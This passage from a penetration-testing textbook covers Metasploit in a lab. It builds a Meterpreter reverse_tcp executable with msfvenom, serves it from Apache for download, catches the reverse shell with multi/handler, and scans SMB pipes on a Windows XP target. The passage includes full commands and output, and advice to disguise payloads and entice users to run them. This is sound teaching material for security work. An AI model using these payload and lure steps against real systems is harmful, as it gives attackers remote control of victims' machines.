### Listing 4-14: Running the Exploit in Msfcli
It appears that the exploit was successful, and we have obtained another shell. This time, instead of initiating a reverse handler to listen on the specified local port (4444), Metasploit starts a handler for the bind shell. After sending the exploit string, the bind handler will automatically connect to the port specified by the payload, establishing a connection to the shell. Once again, we have gained control over the target machine.

### Creating Standalone Payloads with Msfvenom
In 2011, Msfvenom was introduced as part of the Metasploit Framework. Prior to Msfvenom, the tools Msfpayload and Msfencode were used together to create standalone encoded Metasploit payloads in various formats, such as Windows executables and ASP pages. With the introduction of Msfvenom, the functionalities of Msfpayload and Msfencode were combined into a single tool, although these older tools are still included in Metasploit. To view Msfvenom’s help page, use the command `msfvenom -h`.

So far, our goal with Metasploit has been to exploit a vulnerability on the target system and gain control of the machine. Now, we will explore a different approach. Instead of relying on missing patches or other security issues, we aim to exploit the one security issue that may never be fully patched: the users. Msfvenom allows you to create standalone payloads to run on a target system, either through a social-engineering attack (as discussed in Chapter 11) or by uploading a payload to a vulnerable server (as covered in Chapter 8). When all else fails, the user can often be the weakest link.

### Using the Metasploit Framework

#### Choosing a Payload
To list all available payloads, use the command `msfvenom -l payloads`. We will use one of Metasploit’s Meterpreter payloads, `windows/meterpreter/reverse_tcp`, which provides a reverse connection with a Meterpreter shell. Use the `-p` flag to select a payload.

#### Setting Options
To see the correct options for a module, use the `-o` flag after selecting a payload, as shown in Listing 4-15.

```bash
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o
[*] Options for payload/windows/meterpreter/reverse_tcp
Name            Current Setting  Required  Description
----            ---------------  --------  -----------
EXITFUNC        process          yes       Exit technique: seh, thread, process, none
LHOST                            yes       The listen address
LPORT           4444             yes       The listen port
```

As expected, we need to set the `LHOST` and `LPORT` options. For practice, set `LPORT` to 12345 using `LPORT=12345`. We can leave `EXITFUNC` at its default setting. Since this is a reverse connection payload, we need to set the `LHOST` option to specify where the target machine should connect back to (our Kali machine).

#### Choosing an Output Format
Next, specify the output format for the payload. Will it be a Windows executable, or do you want to create an ASP file to upload to a web server? To see all available output formats, use the command `msfvenom --help-formats`.

```bash
root@kali:~# msfvenom --help-formats
Executable formats
asp, aspx, aspx-exe, dll, elf, exe, exe-only, exe-service, exe-small,
loop-vbs, macho, msi, msi-nouac, psh, psh-net, vba, vba-exe, vbs, war
Transform formats
bash, c, csharp, dw, dword, java, js_be, js_le, num, perl, pl, powershell,
psl, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```

To select the output format, use the `-f` option along with the chosen format:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe
```

If you run this command as is, you will see garbage printed to the console. Instead, redirect the output to an executable file, `chapter4example.exe`.

```bash
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe > chapter4example.exe
root@kali:~# file chapter4example.exe
chapter4example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit
```

There is no output to the screen, but running the `file` command on the newly created executable confirms it is a Windows executable. (Later, in Chapter 12, we will discuss how antivirus applications can stop Metasploit payloads and ways to obfuscate standalone payloads to bypass them. In Chapter 11, we will cover methods to lure users into downloading and running malicious payloads.)

### Serving Payloads
A good way to serve up payloads is to host them on a web server, disguise them as something useful, and entice users to download them. For this example, we will host our Metasploit executable on our Kali machine’s built-in Apache server and browse to the file from our target machine.

First, copy the payload executable to the Apache directory and start the web server:

```bash
root@kali:~# cp chapter4example.exe /var/www
root@kali:~# service apache2 start
Starting web server apache2 [ OK ]
```

Now, switch to your Windows XP target and open Internet Explorer. Browse to `http://192.168.20.9/chapter4example.exe` and download the file.

### Using the Multi/Handler Module
Before running the file, we need to set up a handler to catch the Meterpreter connection. Start Msfconsole and use the `multi/handler` module, which allows us to set up standalone handlers.

Select the `multi/handler` module and set the payload and options:

```bash
msf > use multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > show options
Module options (exploit/multi/handler):
Name            Current Setting  Required  Description
----            ---------------  --------  -----------
Payload options (windows/meterpreter/reverse_tcp):
Name            Current Setting  Required  Description
----            ---------------  --------  -----------
EXITFUNC        process          yes       Exit technique: seh, thread, process, none
LHOST                           yes       The listen address
LPORT           4444             yes       The listen port
--snip--
msf exploit(handler) >
```

Set the `LHOST` and `LPORT` options to match the values used when creating the payload:

```bash
msf exploit(handler) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(handler) > set LPORT 12345
LPORT => 12345
msf exploit(handler) > exploit
[*] Started reverse handler on 192.168.20.9:12345
[*] Starting the payload handler...
```

Metasploit sets up a reverse handler on port 12345, listening for a payload to call back.

Now, switch back to the Windows XP target and run the downloaded executable. Back in Msfconsole, you should see the handler receive the reverse connection and establish a Meterpreter session.

```bash
[*] Sending stage (752128 bytes) to 192.168.20.10
[*] Meterpreter session 1 opened (192.168.20.9:12345 -> 192.168.20.10:49437)
at 2015-09-01 11:20:00 -0400
meterpreter >
```

Feel free to experiment with Msfvenom. We will return to this useful tool in Chapter 12 when we attempt to bypass antivirus solutions.

### Using an Auxiliary Module
Metasploit was initially conceived as an exploitation framework and continues to be a top contender in the field. Over the years, its functionality has expanded in numerous directions. In addition to exploitation, Metasploit includes auxiliary modules that aid in every phase of penetration testing, such as vulnerability scanners, fuzzers, and denial-of-service modules. (A good rule of thumb is that exploit modules use a payload, while auxiliary modules do not.)

For example, when we used the `windows/smb/ms08_067_netapi` exploit module earlier, one of its options was `SMBPIPE`. The default value for this option was `BROWSER`. Let’s look at an auxiliary module that enumerates the listening pipes on an SMB server, `auxiliary/scanner/smb/pipe_auditor` (Listing 4-18).

```bash
msf > use scanner/smb/pipe_auditor
msf auxiliary(pipe_auditor) > show options
Module options (auxiliary/scanner/smb/pipe_auditor):
Name            Current Setting  Required  Description
----            ---------------  --------  -----------
RHOSTS                             yes       The target address range or CIDR identifier
SMBDomain   WORKGROUP              no       The Windows domain to use for authentication
SMBPass                             no       The password for the specified username
SMBUser                             no       The username to authenticate as
THREADS      1                      yes       The number of concurrent threads
```

The options for this module are slightly different. Instead of `RHOST`, we have `RHOSTS`, which allows us to specify multiple remote hosts. We also see options for `SMBUser`, `SMBPass`, and `SMBDomain`. For our Windows XP target, we can leave `SMBDomain` at the default value, `WORKGROUP`, and leave `SMBUser` and `SMBPass` blank. The `THREADS` option controls the speed of Metasploit by running the module in multiple threads. Set `RHOSTS` to the IP address of the Windows XP target:

```bash
msf auxiliary(pipe_auditor) > set RHOSTS 192.168.20.10
RHOSTS => 192.168.20.10
msf auxiliary(pipe_auditor) > exploit
[*] 192.168.20.10 - Pipes: \browser
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(pipe_auditor) >
```

The module audits the listening SMB pipes on the Windows XP target. The `browser` pipe is the only available pipe, confirming that this is the correct value for the `SMBPIPE` option in the `windows/smb/ms08_067_netapi` exploit module.

### Updating Metasploit
The exercises in this book are designed to work with a base installation of Kali Linux 1.0.6. However, many security tools, including Metasploit, receive regular updates. All the material in this book works with the Metasploit version installed on Kali 1.0.6. As you continue your career in penetration testing, you will want the latest Metasploit modules. The Metasploit Project regularly releases modules for the latest security issues. To update Metasploit, use the following command:

```bash
root@kali:~# msfupdate
```

### Summary
In this chapter, we have become familiar with some of Metasploit’s interfaces. We will return to Metasploit throughout the book. In the next few chapters, we will simulate a penetration test against our target machines, covering a wide variety of vulnerability types. If you pursue a career in penetration testing, you will encounter clients with varying security postures. Some may have numerous unpatched systems, making it trivial for skilled penetration testers to gain access. Others may have robust patch management and advanced security controls, requiring more sophisticated techniques. Even highly secure networks have weak links, and finding and exploiting them is a key skill for a penetration tester.

Now, let’s turn our attention to gathering information about our targets so we can develop a solid plan of attack.

### Part II: Assessments
### Chapter 5: Information Gathering
In this chapter, we begin the information-gathering phase of penetration testing. The goal is to learn as much about our clients as possible. Does the CEO reveal too much on Twitter? Is the system administrator asking for help securing a Drupal install on archived listservs? What software are their web servers running? Are the Internet-facing systems listening on more ports than they should? For internal penetration tests, what is the IP address of the domain controller?

We will also start to interact with our target systems, learning as much as we can without actively attacking them. The knowledge gained in this phase will help us move on to the threat-modeling phase, where we will identify potential vulnerabilities and develop strategies to exploit them.